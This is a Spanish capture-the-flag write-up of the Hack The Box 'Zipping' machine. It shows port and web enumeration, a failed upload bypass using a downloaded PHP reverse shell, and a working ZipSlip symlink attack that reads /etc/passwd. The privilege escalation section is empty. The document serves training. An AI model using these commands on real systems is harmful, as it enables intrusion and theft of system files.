
![[Pasted image 20241007204608.png]]


https://www.hackthebox.com/machines
---

| ![[Pasted image 20241007194520.png]]![[Pasted image 20241007194515.png]]**  OS** | ![[Pasted image 20241007195719.png]]**  Difficult** | **Tags**      | **RELEASED**   | **Social Media**            |
| -------------------------------------------------------------------------------- | --------------------------------------------------- | ------------- | -------------- | --------------------------- |
| **LINUX**                                                                        | **MEDIUM**                                          | #SQLInjection | **26/08/2023** | https://github.com/gorkaaaa |

Skills:

- File uploading abuse (%00 Injection) [Failed]
- ZipSlip Exploitation Technique for internal reading of files

- SQL Injection + Regular Expression Bypass (%0a) + RCE through into outfile instruction
- Custom binary abuse + Malicious Shared Object (.so) Injection [Privilege Escalation]
---

# Enumeración
*Esta fase va a consistir en hacer una enumeración general sobre la máquina para poder valorar vectores de intrusión y valorar posibles ataques.*

1. Comprobamos Conectividad.
```R
❯ ping -c 1 10.10.11.229
PING 10.10.11.229 (10.10.11.229) 56(84) bytes of data.
64 bytes from 10.10.11.229: icmp_seq=1 ttl=63 time=113 ms

--- 10.10.11.229 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.436/113.436/113.436/0.000 ms
```
*Podemos ver que tenemos conectividad con la máquina...*

2. Enumeración De Sistema Operativo con script.
```R
❯ whichSystem.py 10.10.11.229

	10.10.11.229 (ttl -> 63): Linux
```
*Ahora podemos ver que estamos ante un linux...*

3. Enumeración de Puertos con nmap.
```R
❯ nmap -p- --min-rate 5000 -Pn -n -sS -T5 10.10.11.229 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
*Podemos ver que tenemos 2 puertos...*

```R
❯ extractPorts allPorts
───────┬────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.229
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┼────────────────────────────────────────
```
*Con esta función podemos copiarnos en la clipboard los puertos encontrados...*

```R
❯ nmap -p22,80 -sCV 10.10.11.229
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
*No vemos mucha información relevante respecto a los puetos que tiene...*

4. Puerto 80
```R
❯ whatweb http://10.10.11.229 -v
WhatWeb report for http://10.10.11.229
Status    : 200 OK
Title     : Zipping | Watch store
IP        : 10.10.11.229
Country   : RESERVED, ZZ

Summary   : Apache[2.4.54], Bootstrap, Email[info@website.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.54 (Ubuntu)], JQuery[3.4.1], Meta-Author[Devcrud], PoweredBy[precision], Script

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.54 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ Bootstrap ]
	Bootstrap is an open source toolkit for developing with 
	HTML, CSS, and JS. 

	Website     : https://getbootstrap.com/

[ Email ]
	Extract email addresses. Find valid email address and 
	syntactically invalid email addresses from mailto: link 
	tags. We match syntactically invalid links containing 
	mailto: to catch anti-spam email addresses, eg. bob at 
	gmail.com. This uses the simplified email regular 
	expression from 
	http://www.regular-expressions.info/email.html for valid 
	email address matching. 

	String       : info@website.com

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.54 (Ubuntu) (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse 
	HTML documents, handle events, perform animations, and add 
	AJAX. 

	Version      : 3.4.1
	Website     : http://jquery.com/

[ Meta-Author ]
	This plugin retrieves the author name from the meta name 
	tag - info: 
	http://www.webmarketingnow.com/tips/meta-tags-uncovered.html
	#author

	String       : Devcrud

[ PoweredBy ]
	This plugin identifies instances of 'Powered by x' text and 
	attempts to extract the value for x. 

	String       : precision

[ Script ]
	This plugin detects instances of script HTML elements and 
	returns the script language/type. 


HTTP Headers:
	HTTP/1.1 200 OK
	Date: Mon, 07 Oct 2024 19:03:25 GMT
	Server: Apache/2.4.54 (Ubuntu)
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 4094
	Connection: close
	Content-Type: text/html; charset=UTF-8
```
*Podemos ver las tecnologias con las que trabaja la máquina a explotar...*

![[Pasted image 20241007210339.png]]
*Esto es lo que vemos cuando entramos a la página.*

![[Pasted image 20241007212339.png]]
*Vemos que tenemos una parte para subir un documento pdf...*

```R
❯ curl -s -X GET https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php > cmd.php
```
*Nos traemos este recurso y cambiamos los parametros de IP y Puerto.*

```R
❯ mv cmd.php cmd.phpA.pdf
```
*Cambiamos el nombre para poder ahora manipularlo...*

```R
❯ zip cmd.zip cmd.phpA.pdf
  adding: cmdA.php.pdf (deflated 59%)
```
*Lo ponemos en un zip...*

![[Pasted image 20241007212754.png]]
*Lo subimos...*

![[Pasted image 20241007212949.png]]
*Ahora con el burpsuite vamos a interceptarlo.*

![[Pasted image 20241007213058.png]]
*Modificamos el byte que contiene la A y lo quitamos...*

![[Pasted image 20241007213452.png]]
*Vemos que no ha funcionado...*

# Explotación
*En esta fase vamos a ya tener un vector de ataque previamente enumerado y vamos a explotarlo.*

1. Creación de archivo con enlace simbolico...
```R
❯ ln -s /etc/passwd test.pdf
```
*Nos creamos un archivo pdf de prueba...*

```R
lrwxrwxrwx root root  11 B  Mon Oct  7 17:37:35 2024  test.pdf ⇒ /etc/passwd
```
*Podemos ver como és el enlace simbolico...*

```R
❯ zip --symlinks test.zip test.pdf
```
*Ahora lo comprimimos...*

![[Pasted image 20241007213934.png]]
*Subimos el archivo...*

![[Pasted image 20241007214106.png]]
*Vemos que nos devuelve algo en base64...*

```R
❯ echo "cm9vdDp4OjA6MDp..." | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```
*Ahora podemos ver que nos devuelve todo el /etc/hosts*

```R
❯ ln -sf /home/rektsu/user.txt test.pdf
❯ zip --symlinks prueba.zip test.pdf
```
*Si ahora hacemos esto para poder extraer la user flag...*





# Escalada de privilegios
*Esta fase va a consistir en pasar de ser un usuario no privilegiado a ser el administrador del sistema aprovechandonos de fallos en la seguridad internos del servidor.*

